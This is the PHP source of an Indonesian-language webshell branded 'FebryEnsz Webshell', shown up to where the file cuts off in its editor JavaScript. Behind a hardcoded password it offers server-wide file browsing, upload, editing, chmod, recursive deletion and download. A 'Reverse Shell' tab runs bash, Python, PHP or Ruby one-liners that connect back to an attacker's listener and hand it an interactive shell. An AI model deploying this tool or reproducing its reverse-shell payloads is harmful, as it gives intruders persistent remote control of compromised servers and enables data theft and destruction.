<?php

// Sab, 31 Mei, 2025
// Create by FebryEnsz
// Username: @DarknessDevs, @febrykullbet
session_start();


define('SHELL_BRAND', 'FebryEnsz Webshell');
define('PASSWORD', 'UrPass'); // Replace to ur password
define('SCRIPT_DIR', str_replace(DIRECTORY_SEPARATOR, '/', realpath(__DIR__))); 

function is_logged_in() {
    return isset($_SESSION['febryensz_logged_in']) && $_SESSION['febryensz_logged_in'] === true;
}

function login() {
    if (isset($_POST['password'])) {
        if ($_POST['password'] === PASSWORD) {
            $_SESSION['febryensz_logged_in'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            return "Password salah!";
        }
    }
    return null;
}

function logout() {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

function get_current_path_unsafe() {
    $path_to_check = realpath(getcwd()); 

    if (isset($_GET['path'])) {
        $requested_path_raw = $_GET['path'];
        $real_path = realpath($requested_path_raw);

        if ($real_path !== false && is_dir($real_path)) {
            $path_to_check = $real_path;
        } elseif ($real_path === false) {
            
            $path_to_check = SCRIPT_DIR;
        }
        
        
    }
    
    if ($path_to_check === false || !is_dir($path_to_check)) {
        $path_to_check = SCRIPT_DIR; 
        if ($path_to_check === false) { 
            die("CRITICAL ERROR: Cannot determine a valid working directory.");
        }
    }

    if (str_replace(DIRECTORY_SEPARATOR, '/', getcwd()) !== str_replace(DIRECTORY_SEPARATOR, '/', $path_to_check)) {
        if (!@chdir($path_to_check)) {
            
            @chdir(SCRIPT_DIR);
        }
    }
    return str_replace(DIRECTORY_SEPARATOR, '/', getcwd());
}

function format_size($bytes) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($bytes >= 1024 && $i < count($units) - 1) {
        $bytes /= 1024;
        $i++;
    }
    return round($bytes, 2) . ' ' . $units[$i];
}

function get_perms($file) {
    $perms = @fileperms($file);
    if ($perms === false) return '---------';
    if (($perms & 0xC000) == 0xC000) $info = 's'; elseif (($perms & 0xA000) == 0xA000) $info = 'l';
    elseif (($perms & 0x8000) == 0x8000) $info = '-'; elseif (($perms & 0x6000) == 0x6000) $info = 'b';
    elseif (($perms & 0x4000) == 0x4000) $info = 'd'; elseif (($perms & 0x2000) == 0x2000) $info = 'c';
    elseif (($perms & 0x1000) == 0x1000) $info = 'p'; else $info = 'u';
    $info .= (($perms & 0x0100) ? 'r' : '-'); $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-'); $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

function sanitize_filename($filename) {
    $filename = preg_replace('/[\x00-\x1F\x7F]/', '', $filename); 
    $filename = str_replace(['/', '\\', '..'], '', $filename); 
    return basename($filename); 
}

function recursive_delete($target) {
    if (is_dir($target)) {
        $items = array_diff(scandir($target), ['.', '..']);
        foreach ($items as $item) {
            recursive_delete($target . DIRECTORY_SEPARATOR . $item);
        }
        return @rmdir($target);
    } elseif (is_file($target)) {
        return @unlink($target);
    }
    return false;
}

function generate_breadcrumbs_unsafe($current_path_param) {
    $current_path_norm = rtrim(str_replace(DIRECTORY_SEPARATOR, '/', $current_path_param), '/');
    if (empty($current_path_norm)) $current_path_norm = '/'; 

    $path_parts_display = [];
    $segments = array_filter(explode('/', $current_path_norm));
    
    $path_parts_display[] = "<a href='" . htmlspecialchars($_SERVER['PHP_SELF']) . "?path=" . urlencode('/') . "'>" . (stripos(PHP_OS, 'WIN') === 0 ? 'Drives' : '/') . "</a>";

    $path_so_far = '';
    foreach ($segments as $segment) {
        $path_so_far .= '/' . $segment;
        
        $real_segment_path = realpath($path_so_far); 

        if ($real_segment_path) {
            $display_segment = htmlspecialchars($segment);
            if (str_replace(DIRECTORY_SEPARATOR, '/', $real_segment_path) !== $current_path_norm) {
                $path_parts_display[] = "<a href='" . htmlspecialchars($_SERVER['PHP_SELF']) . "?path=" . urlencode($real_segment_path) . "'>" . $display_segment . "</a>";
            } else {
                $path_parts_display[] = "<span class='current-segment'>" . $display_segment . "</span>";
            }
        } else { 
            $path_parts_display[] = "<span class='current-segment'>" . htmlspecialchars($segment) . "</span>";
        }
    }
    
    if (empty($segments) && $current_path_norm === '/') {
       if (count($path_parts_display) > 1) array_pop($path_parts_display); 
       $path_parts_display[] = "<span class='current-segment'>" . (stripos(PHP_OS, 'WIN') === 0 ? 'Root' : '(Root)') . "</span>";
    }
    return implode("<span class='separator'> / </span>", $path_parts_display);
}

$current_path = '';
$message = '';
$error_message = '';

if (isset($_GET['logout'])) logout();

if (!is_logged_in()) {
    $login_error = login();
} else {
    $current_path = get_current_path_unsafe();
    $action = isset($_GET['action']) ? $_GET['action'] : 'list';
    $file_param = isset($_REQUEST['file']) ? sanitize_filename($_REQUEST['file']) : null;
    $item_path = $file_param ? rtrim($current_path, '/') . '/' . $file_param : null;

    if ($action === 'upload' && isset($_FILES['uploaded_file'])) {
        if ($_FILES['uploaded_file']['error'] === UPLOAD_ERR_OK) {
            $uploaded_file_name = sanitize_filename($_FILES['uploaded_file']['name']);
            $destination = rtrim($current_path, '/') . '/' . $uploaded_file_name;
            if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $destination)) {
                $message = "File '" . htmlspecialchars($uploaded_file_name) . "' berhasil diunggah.";
            } else {
                $error_message = "Gagal mengunggah file. Periksa izin tulis.";
            }
        } else { $error_message = "Error unggah: " . $_FILES['uploaded_file']['error']; }
    }
    elseif ($action === 'rename' && $file_param && isset($_POST['new_name']) && $item_path) {
        $new_name = sanitize_filename($_POST['new_name']);
        if (empty($new_name)) { $error_message = "Nama baru tidak boleh kosong."; }
        else {
            $new_path = rtrim($current_path, '/') . '/' . $new_name;
            if (file_exists($new_path)) { $error_message = "File/folder '$new_name' sudah ada."; }
            elseif (@rename($item_path, $new_path)) {
                $message = "'".htmlspecialchars($file_param)."' diubah ke '".htmlspecialchars($new_name)."'.";
                header("Location: ".$_SERVER['PHP_SELF']."?path=".urlencode($current_path)."&msg=".urlencode($message)); exit;
            } else { $error_message = "Gagal mengubah nama '".htmlspecialchars($file_param)."'."; }
        }
    }
    elseif ($action === 'delete' && $file_param && $item_path) {
        $real_item_path = realpath($item_path);
        if ($real_item_path === false) { $error_message = "Item '".htmlspecialchars($file_param)."' tidak ditemukan."; }
        elseif (rtrim($real_item_path, '/') === rtrim(SCRIPT_DIR, '/')) { $error_message = "Tidak dapat menghapus direktori skrip shell ini."; }
        elseif ($real_item_path === '/' || preg_match('/^[A-Z]:\/$/i', $real_item_path)) { $error_message = "Tidak dapat menghapus root filesystem."; } 
        elseif (recursive_delete($real_item_path)) { $message = "Item '".htmlspecialchars($file_param)."' berhasil dihapus."; }
        else { $error_message = "Gagal menghapus item '".htmlspecialchars($file_param)."'."; }
    }
    elseif ($action === 'chmod' && $file_param && isset($_POST['perms']) && $item_path) {
        $perms_str = $_POST['perms'];
        if (preg_match('/^[0-7]{3,4}$/', $perms_str)) {
            $perms_oct = octdec(str_pad($perms_str, 4, '0', STR_PAD_LEFT));
            if (@chmod($item_path, $perms_oct)) { $message = "Izin '".htmlspecialchars($file_param)."' diubah ke ".htmlspecialchars($perms_str)."."; }
            else { $error_message = "Gagal mengubah izin '".htmlspecialchars($file_param)."'."; }
        } else { $error_message = "Format izin tidak valid (misal: 755, 0644)."; }
    }
    elseif ($action === 'edit' && $file_param && $item_path && is_file($item_path)) {
        if (isset($_POST['file_content'])) {
            if (@file_put_contents($item_path, $_POST['file_content']) !== false) { $message = "File '".htmlspecialchars($file_param)."' berhasil disimpan."; }
            else { $error_message = "Gagal menyimpan file '".htmlspecialchars($file_param)."'."; }
        }
    }
    elseif ($action === 'download' && $file_param && $item_path && is_file($item_path)) {
        if (is_readable($item_path)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . sanitize_filename(basename($item_path)) . '"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($item_path));
            flush(); 
            readfile($item_path);
            exit;
        } else { $error_message = "File '".htmlspecialchars($file_param)."' tidak dapat dibaca."; }
    }
    elseif ($action === 'reverse_shell' && isset($_POST['ip']) && isset($_POST['port']) && isset($_POST['type'])) {
        $ip = trim($_POST['ip']); $port = (int)$_POST['port']; $type = $_POST['type']; $cmd = '';
        if (!filter_var($ip, FILTER_VALIDATE_IP)) { $error_message = "Alamat IP tidak valid."; }
        elseif ($port <= 0 || $port > 65535) { $error_message = "Port tidak valid."; }
        else {
            $escaped_ip = escapeshellarg($ip); $escaped_port = escapeshellarg($port);
            switch ($type) {
                case 'bash': $cmd = "bash -i >& /dev/tcp/{$escaped_ip}/{$escaped_port} 0>&1"; break;
                case 'python': $cmd = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(({$escaped_ip},{$escaped_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"; break;
                case 'php': $php_payload = 'error_reporting(0);$ip = '.$escaped_ip.';$port = '.$escaped_port.';if(($f = "stream_socket_client") && is_callable($f)){$s=$f("tcp://{$ip}:{$port}");$s_type = "stream";} elseif(($f = "fsockopen") && is_callable($f)){$s=$f($ip,$port);$s_type = "socket";} elseif(($f = "socket_create") && is_callable($f)){$s=$f(AF_INET,SOCK_STREAM,SOL_TCP);$res=@socket_connect($s,$ip,$port);if(!$res){die();}$s_type = "socket";}else{die("no socket functions");}if(!$s){die("no socket");}if($s_type=="stream"){$len=fread($s,4);}else{$len=socket_read($s,4);}if(!$len){die();}passthru("/bin/sh -i <&3 >&3 2>&3");@stream_socket_shutdown($s,STREAM_SHUT_RDWR);'; $cmd = "php -r ".escapeshellarg($php_payload); break;
                case 'ruby': $cmd = "ruby -rsocket -e'exit if fork;c=TCPSocket.new({$escaped_ip},{$escaped_port});while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"; break;
                default: $error_message = "Tipe reverse shell tidak dikenal.";
            }
            if ($cmd && (function_exists('shell_exec') || function_exists('exec') || function_exists('system') || function_exists('passthru')) ) {
                $message = "Mencoba koneksi reverse shell ke {$ip}:{$port} ({$type})...";
                if (function_exists('shell_exec')) shell_exec($cmd . " > /dev/null 2>&1 &");
                elseif (function_exists('exec')) exec($cmd . " > /dev/null 2>&1 &");
                elseif (function_exists('system')) system($cmd . " > /dev/null 2>&1 &");
                elseif (function_exists('passthru')) passthru($cmd . " > /dev/null 2>&1 &");
            } elseif (!$cmd) {} else { $error_message = "Fungsi eksekusi perintah tidak diaktifkan."; }
        }
    }
}

if(isset($_GET['msg'])) $message = htmlspecialchars(urldecode($_GET['msg']));
if(isset($_GET['err'])) $error_message = htmlspecialchars(urldecode($_GET['err']));
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo htmlspecialchars(SHELL_BRAND); ?> - <?php echo htmlspecialchars($current_path ?: 'Login'); ?></title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        :root {--bg-dark:#1e1e2e;--bg-medium:#27293d;--bg-light:#3b3e55;--text-primary:#cdd6f4;--text-secondary:#a6adc8;--accent-pink:#f5c2e7;--accent-mauve:#cba6f7;--accent-red:#f38ba8;--accent-peach:#fab387;--accent-yellow:#f9e2af;--accent-green:#a6e3a1;--accent-sky:#89dceb;--accent-sapphire:#74c7ec;--accent-blue:#89b4fa;--accent-lavender:#b4befe;--border-color:#494d64;}
        * { box-sizing: border-box; } body { font-family: 'Roboto','Segoe UI',sans-serif; margin:0; background-color:var(--bg-dark); color:var(--text-primary); font-size:14px; line-height:1.6; }
        .container { max-width:1200px; margin:20px auto; padding:20px; background-color:var(--bg-medium); border-radius:12px; box-shadow:0 8px 16px rgba(0,0,0,0.2); }
        h1,h2,h3 { color:var(--accent-sky); margin-top:0; } h1 { font-size:2em; text-align:center; margin-bottom:5px; font-weight:500; } h1 .brand { font-weight:700; color:var(--accent-green); }
        .subtitle { text-align:center; font-size:0.9em; color:var(--accent-mauve); margin-bottom:25px; }
        table { width:100%; border-collapse:collapse; margin-bottom:20px; background-color:var(--bg-light); border-radius:6px; overflow:hidden; }
        th,td { padding:10px 15px; border-bottom:1px solid var(--border-color); text-align:left; word-break:break-word; } th { background-color:var(--bg-medium); color:var(--accent-sapphire); font-weight:500; }
        tr:last-child td { border-bottom:none; } tr:hover { background-color:#3e4057; } a { color:var(--accent-blue); text-decoration:none; } a:hover { color:var(--accent-sky); text-decoration:underline; }
        .action-links a { margin-right:10px; font-size:1.1em; } .message { padding:12px 18px; margin-bottom:20px; border-radius:6px; border-left:4px solid; }
        .success { background-color:rgba(166,227,161,0.1); color:var(--accent-green); border-left-color:var(--accent-green); } .error { background-color:rgba(243,139,168,0.1); color:var(--accent-red); border-left-color:var(--accent-red); }
        .breadcrumbs-bar { margin-bottom:20px; padding:10px 15px; background-color:var(--bg-light); border:1px solid var(--border-color); border-radius:6px; font-size:0.95em; word-break:break-all; display:flex; align-items:center; flex-wrap:wrap; }
        .breadcrumbs-bar strong { color:var(--accent-peach); margin-right:8px; } .breadcrumbs-bar a, .breadcrumbs-bar span.current-segment { color:var(--accent-sky); margin:0 3px; }
        .breadcrumbs-bar a:hover { color:var(--accent-green); } .breadcrumbs-bar span.current-segment { color:var(--text-primary); font-weight:500; } .breadcrumbs-bar span.separator { color:var(--text-secondary); }
        .form-section { margin-bottom:25px; padding:20px; background-color:var(--bg-light); border-radius:8px; } .form-section h3 { color:var(--accent-peach); margin-bottom:15px; font-weight:500;}
        label { display:block; margin-bottom:8px; font-weight:500; color:var(--text-secondary); }
        input[type="text"],input[type="password"],input[type="file"],select { width:100%; padding:10px 12px; margin-bottom:15px; border:1px solid var(--border-color); background-color:var(--bg-medium); color:var(--text-primary); border-radius:6px; font-size:1em; }
        textarea { width:100%; padding:10px 12px; margin-bottom:15px; border:1px solid var(--border-color); background-color:var(--bg-medium); color:var(--text-primary); border-radius:6px; font-size:1em; min-height:250px; font-family:'Courier New',monospace; resize:vertical; }
        input[type="file"] { padding:5px; }
        button,input[type="submit"] { background-color:var(--accent-blue); color:var(--bg-dark); border:none; padding:10px 20px; border-radius:6px; cursor:pointer; font-weight:500; font-size:1em; transition:background-color 0.2s ease; }
        button:hover,input[type="submit"]:hover { background-color:var(--accent-sky); } .login-form { max-width:400px; margin:50px auto; padding:30px; background-color:var(--bg-medium); border-radius:12px; }
        .logout-link { position:absolute; top:25px; right:30px; color:var(--accent-pink); padding:8px 12px; background-color:var(--bg-light); border-radius:6px; font-size:0.9em; }
        .logout-link:hover { background-color:var(--bg-dark); text-decoration:none; }
        .nav-tabs { display:flex; margin-bottom:20px; border-bottom:2px solid var(--border-color); }
        .nav-tabs a { padding:10px 20px; color:var(--text-secondary); text-decoration:none; border-radius:6px 6px 0 0; margin-right:5px; font-weight:500; border:2px solid transparent; border-bottom:none; position:relative; top:2px; }
        .nav-tabs a.active,.nav-tabs a:hover { color:var(--accent-sky); background-color:var(--bg-light); border-color:var(--border-color); } .nav-tabs a.active { border-bottom-color:var(--bg-light); }
        .file-content-view { background-color:var(--bg-dark); color:var(--text-primary); padding:20px; border:1px solid var(--border-color); border-radius:6px; white-space:pre-wrap; word-break:break-all; font-family:'Courier New',monospace; max-height:600px; overflow-y:auto; font-size:0.9em; }
        .flex-container { display:flex; flex-wrap:wrap; gap:20px; } .flex-item { flex:1; min-width:300px; } .table-responsive { overflow-x:auto; }
        .footer-text { text-align:center; font-size:0.85em; color:var(--text-secondary); margin-top:30px; padding-top:20px; border-top:1px solid var(--border-color); }
        .footer-warning { color: var(--accent-red); font-weight: bold; display: block; margin-top: 10px; }

        .code-editor-wrapper { display: flex; border: 1px solid var(--border-color); border-radius: 6px; background-color: var(--bg-dark); margin-bottom: 15px; min-height: 250px; }
        .line-numbers-gutter { padding: 10px 8px 10px 10px; background-color: var(--bg-medium); color: var(--text-secondary); font-family: 'Courier New', monospace; font-size: 0.9em; line-height: 1.5; text-align: right; user-select: none; border-right: 1px solid var(--border-color); overflow-y: hidden; }
        .line-numbers-gutter > div { white-space: nowrap; }
        .code-editor-textarea { flex-grow: 1; padding: 10px; border: none; background-color: var(--bg-dark); color: var(--text-primary); border-radius: 0 6px 6px 0; font-size: 0.9em; line-height: 1.5; font-family: 'Courier New', monospace; resize: none; min-height: inherit; white-space: pre; overflow-wrap: normal; overflow-x: auto; }
        textarea.code-editor-textarea { margin-bottom: 0; border-radius:0; }
        @media (max-width:768px) { .container { margin:10px; padding:15px; } h1 { font-size:1.6em; } .subtitle { font-size:0.8em; } .logout-link { position:static; display:block; text-align:center; margin:0 auto 20px auto; width:fit-content; }
        .nav-tabs { flex-direction:column; } .nav-tabs a { margin-right:0; margin-bottom:2px; border-radius:6px; } .nav-tabs a.active { border-bottom-color:var(--border-color); } th,td { padding:8px 10px; font-size:0.9em; }
        .action-links a { margin-right:8px; font-size:1em; } .flex-item { min-width:100%; } .breadcrumbs-bar { font-size:0.85em; } }
        @media (max-width:480px) { body { font-size:13px; } h1 { font-size:1.4em; } input[type="text"],input[type="password"],input[type="file"],textarea,select,button,input[type="submit"] { font-size:0.95em; padding:8px 10px; }
        .message { padding:10px 15px; } .breadcrumbs-bar { flex-direction:column; align-items:flex-start;} .breadcrumbs-bar strong { margin-bottom:5px;} .breadcrumbs-bar a,.breadcrumbs-bar span.current-segment,.breadcrumbs-bar span.separator { margin-left:0; }}
    </style>
</head>
<body>
    <div class="container">
        <?php if (is_logged_in()): ?> <a href="?logout=true" class="logout-link" title="Logout">🚪 Exit</a> <?php endif; ?>
        <h1><span class="brand"><?php echo htmlspecialchars(SHELL_BRAND); ?></span></h1>

        <?php if (!is_logged_in()): ?>
            <div class="login-form">
                <h2>Login</h2>
                <?php if (isset($login_error)): ?><p class="message error"><?php echo htmlspecialchars($login_error); ?></p><?php endif; ?>
                <form method="POST" action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>">
                    <label for="password">Password:</label><input type="password" id="password" name="password" required autofocus>
                    <button type="submit">Login</button>
                </form>
            </div>
        <?php else: ?>
            <div class="breadcrumbs-bar">
                <?php echo generate_breadcrumbs_unsafe($current_path); ?>
                 | <a href="<?php echo htmlspecialchars($_SERVER['PHP_SELF'] . '?path=' . urlencode(SCRIPT_DIR)); ?>" style="margin-left: 10px; color: var(--accent-lavender);" title="Ke Direktori Awal Shell">🏠 Awal Shell</a>
            </div>

            <?php if ($message): ?><p class="message success"><?php echo $message; ?></p><?php endif; ?>
            <?php if ($error_message): ?><p class="message error"><?php echo $error_message; ?></p><?php endif; ?>

            <?php
            $view_file = isset($_GET['view']) ? sanitize_filename($_GET['view']) : null;
            $edit_file_name = isset($_GET['action']) && $_GET['action'] === 'edit' && isset($_GET['file']) ? sanitize_filename($_GET['file']) : null;
            $file_to_view_path = $view_file ? rtrim($current_path, '/') . '/' . $view_file : null;
            $file_to_edit_path = $edit_file_name ? rtrim($current_path, '/') . '/' . $edit_file_name : null;

            if ($view_file && $file_to_view_path && is_file($file_to_view_path)) {
                echo "<h2>Melihat File: " . htmlspecialchars($view_file) . "</h2>";
                $text_ext = ['txt','php','html','css','js','json','xml','md','log','ini','conf','sh','py','rb','c','cpp','java','cfg','htaccess','env'];
                $file_ext = strtolower(pathinfo($file_to_view_path, PATHINFO_EXTENSION));
                $file_size = @filesize($file_to_view_path);
                if ($file_size === false) { echo "<p class='message error'>Tidak dapat membaca ukuran file.</p>"; }
                elseif (in_array($file_ext, $text_ext) && $file_size < 2*1024*1024) {
                    $content = @file_get_contents($file_to_view_path);
                    if ($content === false) { echo "<p class='message error'>Tidak dapat membaca file.</p>"; }
                    else {
                        echo "<div class='file-content-view'>" . htmlspecialchars($content) . "</div>";
                        echo "<p style='margin-top:15px;'><a href='".htmlspecialchars($_SERVER['PHP_SELF']."?path=".urlencode($current_path)."&action=edit&file=".urlencode($view_file))."' class='button-like'>✏️ Edit</a> ";
                        echo "<a href='".htmlspecialchars($_SERVER['PHP_SELF']."?path=".urlencode($current_path)."&action=download&file=".urlencode($view_file))."' class='button-like'>💾 Download</a></p>";
                    }
                } else { echo "<p>File ini mungkin bukan teks atau terlalu besar (>2MB). Coba <a href='".htmlspecialchars($_SERVER['PHP_SELF']."?path=".urlencode($current_path)."&action=download&file=".urlencode($view_file))."'>Download</a>.</p>"; }
                echo "<p style='margin-top:15px;'><a href='".htmlspecialchars($_SERVER['PHP_SELF']."?path=".urlencode($current_path))."'>Kembali ke Daftar File</a></p>";
            } elseif ($edit_file_name && $file_to_edit_path && is_file($file_to_edit_path)) {
                echo "<h2>Edit File: " . htmlspecialchars($edit_file_name) . "</h2>";
                $content = @file_get_contents($file_to_edit_path);
                if ($content === false) { echo "<p class='message error'>Tidak dapat membaca file untuk diedit.</p>"; }
                else { ?>
                <form method="POST" action="<?php echo htmlspecialchars($_SERVER['PHP_SELF'].'?path='.urlencode($current_path).'&action=edit&file='.urlencode($edit_file_name)); ?>">
                    <div class="code-editor-wrapper">
                        <div class="line-numbers-gutter"></div>
                        <textarea name="file_content" class="code-editor-textarea" spellcheck="false"><?php echo htmlspecialchars($content); ?></textarea>
                    </div>
                    <button type="submit">Simpan</button>
                    <a href="<?php echo htmlspecialchars($_SERVER['PHP_SELF'].'?path='.urlencode($current_path)); ?>" style="margin-left:10px;display:inline-block;padding:10px 15px;background-color:var(--bg-light);color:var(--text-secondary);border-radius:6px;">Batal</a>
                </form>
                <?php }
            } else { ?>
                <div class="nav-tabs">
                    <a href="#filemanager" class="tab-link active" data-target="filemanager">🗂️ File Manager</a>
                    <a href="#tools" class="tab-link" data-target="tools">🛠️ Tools</a>
                </div>
                <div id="filemanager" class="tab-content active">
                    <?php
                    if (isset($_GET['action']) && $_GET['action']==='rename_form' && isset($_GET['file'])) {
                        $file_to_rename = sanitize_filename($_GET['file']);
                        if (file_exists(rtrim($current_path, '/').'/'.$file_to_rename)) {
                            echo "<div class='form-section action-form' id='rename_section'><h3>Rename '".htmlspecialchars($file_to_rename)."'</h3>";
                            echo "<form method='POST' action='".htmlspecialchars($_SERVER['PHP_SELF']."?path=".urlencode($current_path)."&action=rename&file=".urlencode($file_to_rename))."'>";
                            echo "<label for='new_name'>Nama Baru:</label><input type='text' name='new_name' id='new_name' value='".htmlspecialchars($file_to_rename)."' required>";
                            echo "<button type='submit'>Rename</button> <a href='".htmlspecialchars($_SERVER['PHP_SELF']."?path=".urlencode($current_path))."' style='margin-left:10px;'>Batal</a></form></div>";
                        }
                    }
                    if (isset($_GET['action']) && $_GET['action']==='chmod_form' && isset($_GET['file'])) {
                        $file_to_chmod = sanitize_filename($_GET['file']);
                        $path_to_chmod = rtrim($current_path, '/').'/'.$file_to_chmod;
                        if (file_exists($path_to_chmod)) {
                            $perm_str = substr(sprintf('%o',@fileperms($path_to_chmod)),-4); if(strlen($perm_str)==3) $perm_str="0".$perm_str;
                            echo "<div class='form-section action-form' id='chmod_section'><h3>Chmod '".htmlspecialchars($file_to_chmod)."' (Now: ".$perm_str.")</h3>";
                            echo "<form method='POST' action='".htmlspecialchars($_SERVER['PHP_SELF']."?path=".urlencode($current_path)."&action=chmod&file=".urlencode($file_to_chmod))."'>";
                            echo "<label for='perms'>Izin Baru (oktal):</label><input type='text' name='perms' id='perms' value='".$perm_str."' pattern='[0-7]{3,4}' placeholder='0755' required>";
                            echo "<button type='submit'>Chmod</button> <a href='".htmlspecialchars($_SERVER['PHP_SELF']."?path=".urlencode($current_path))."' style='margin-left:10px;'>Batal</a></form></div>";
                        }
                    } ?>
                    <h3>Daftar File dan Folder</h3><div class="table-responsive"><table><thead><tr><th>Nama</th><th>Ukuran</th><th>Izin</th><th>Modifikasi</th><th>Aksi</th></tr></thead><tbody>
                    <?php
                    $real_current_path = realpath($current_path);
                    if ($real_current_path && $real_current_path !== '/' && (stripos(PHP_OS, 'WIN') === 0 ? (preg_match('/^[A-Z]:\/$/i', $real_current_path) == 0) : true) ) { 
                        $parent_dir = realpath($current_path . '/..');
                        if ($parent_dir) echo "<tr><td><a href='".htmlspecialchars($_SERVER['PHP_SELF']."?path=".urlencode($parent_dir))."'>⤴️ .. (Parent)</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr>";
                    }
                    $items = @scandir($current_path); if ($items===false) { $error_message.=" Tidak dapat baca direktori ".htmlspecialchars($current_path); $items=[]; }
                    $folders=[]; $files=[];
                    foreach ($items as $item) {
                        if ($item==='.'||$item==='..') continue; $item_full_path = rtrim($current_path,'/').'/'.$item; if (!file_exists($item_full_path)) continue;
                        if (is_dir($item_full_path)) $folders[]=$item; else $files[]=$item;
                    }
                    natcasesort($folders); natcasesort($files); $sorted_items = array_merge($folders, $files);
                    foreach ($sorted_items as $item): $item_full_path = rtrim($current_path,'/').'/'.$item; $is_dir=is_dir($item_full_path); ?>
                    <tr><td><?php if ($is_dir):?><a href="<?php echo htmlspecialchars($_SERVER['PHP_SELF'].'?path='.urlencode($item_full_path)); ?>">📁 <?php echo htmlspecialchars($item);?></a>
                        <?php else:?><a href="<?php echo htmlspecialchars($_SERVER['PHP_SELF'].'?path='.urlencode($current_path).'&view='.urlencode($item)); ?>">📄 <?php echo htmlspecialchars($item);?></a><?php endif;?></td>
                        <td><?php echo $is_dir?'-':format_size(@filesize($item_full_path));?></td><td><?php echo get_perms($item_full_path);?></td>
                        <td><?php echo date("d M Y, H:i",@filemtime($item_full_path));?></td><td class="action-links">
                        <a href="<?php echo htmlspecialchars($_SERVER['PHP_SELF'].'?path='.urlencode($current_path).'&action=rename_form&file='.urlencode($item).'#rename_section');?>" title="Rename">✏️</a>
                        <a href="<?php echo htmlspecialchars($_SERVER['PHP_SELF'].'?path='.urlencode($current_path).'&action=chmod_form&file='.urlencode($item).'#chmod_section');?>" title="Chmod">🔧</a>
                        <a href="<?php echo htmlspecialchars($_SERVER['PHP_SELF'].'?path='.urlencode($current_path).'&action=delete&file='.urlencode($item));?>" onclick="return confirm('Yakin hapus: <?php echo htmlspecialchars(addslashes($item));?>?');" title="Delete">🗑️</a>
                        <?php if(!$is_dir):?><a href="<?php echo htmlspecialchars($_SERVER['PHP_SELF'].'?path='.urlencode($current_path).'&action=edit&file='.urlencode($item));?>" title="Edit">📝</a>
                        <a href="<?php echo htmlspecialchars($_SERVER['PHP_SELF'].'?path='.urlencode($current_path).'&action=download&file='.urlencode($item));?>" title="Download">💾</a><?php endif;?></td></tr>
                    <?php endforeach; if(empty($sorted_items)):?><tr><td colspan="5" style="text-align:center;padding:20px;">Folder kosong.</td></tr><?php endif;?></tbody></table></div></div>
                <div id="tools" class="tab-content" style="display:none;"><div class="flex-container">
                    <div class="form-section flex-item"><h3>📤 Upload File</h3>
                        <form method="POST" action="<?php echo htmlspecialchars($_SERVER['PHP_SELF'].'?path='.urlencode($current_path).'&action=upload');?>" enctype="multipart/form-data">
                        <label for="uploaded_file">Pilih File:</label><input type="file" name="uploaded_file" id="uploaded_file" required><button type="submit">Upload</button></form></div>
                    <div class="form-section flex-item"><h3>🔌 Reverse Shell</h3>
                        <form method="POST" action="<?php echo htmlspecialchars($_SERVER['PHP_SELF'].'?path='.urlencode($current_path).'&action=reverse_shell');?>">
                        <label for="rev_ip">IP Listener:</label><input type="text" name="ip" id="rev_ip" placeholder="10.10.10.1" required>
                        <label for="rev_port">Port Listener:</label><input type="text" name="port" id="rev_port" placeholder="4444" pattern="\d{1,5}" required>
                        <label for="rev_type">Tipe Shell:</label><select name="type" id="rev_type"><option value="bash">Bash</option><option value="python">Python</option><option value="php">PHP</option><option value="ruby">Ruby</option></select>
                        <button type="submit">Connect</button></form><p style="font-size:0.9em;color:var(--text-secondary);"><small>Listener: <code>nc -lvnp [PORT]</code>. Keberhasilan tergantung server.</small></p></div>
                </div></div> <?php } ?>
            <script>
            document.addEventListener('DOMContentLoaded',function(){
                const t=document.querySelectorAll('.nav-tabs .tab-link'),e=document.querySelectorAll('.tab-content');
                function o(o){
                    e.forEach(t=>{t.style.display=t.id===o?'block':'none'});
                    t.forEach(t=>{t.classList.toggle('active',t.dataset.target===o)});
                    try{localStorage.setItem('activeFebryEnszShellTab',o)}catch(t){}
                }
                t.forEach(t=>{t.addEventListener('click',function(t){
                    t.preventDefault();const e=this.dataset.target;o(e)
                })});
                let n='filemanager';
                const c=window.location.hash;
                if(c){
                    const t=document.getElementById(c.substring(1));
                    if(t){document.getElementById('tools').contains(t)&&(n='tools'),o(n),setTimeout(()=>{t.scrollIntoView({behavior:'smooth',block:'center'})},100)}
                }else{
                    try{const t=localStorage.getItem('activeFebryEnszShellTab');t&&document.getElementById(t)&&(n=t)}catch(t){}
                    o(n)
                }

                const editorTextarea = document.querySelector('.code-editor-textarea');
                const lineNumbersGutter = document.querySelector('.line-numbers-gutter');

                if (editorTextarea && lineNumbersGutter) {
                    function updateLineNumbers() {
                        const lines = editorTextarea.value.split('\\n');
                        const lineCount = lines.length;
                        lineNumbersGutter.innerHTML = '';
                        for (let i = 1; i <= lineCount; i++) {
                            const lineNumberElement = document.createElement('div');
                            lineNumberElement.textContent = i;
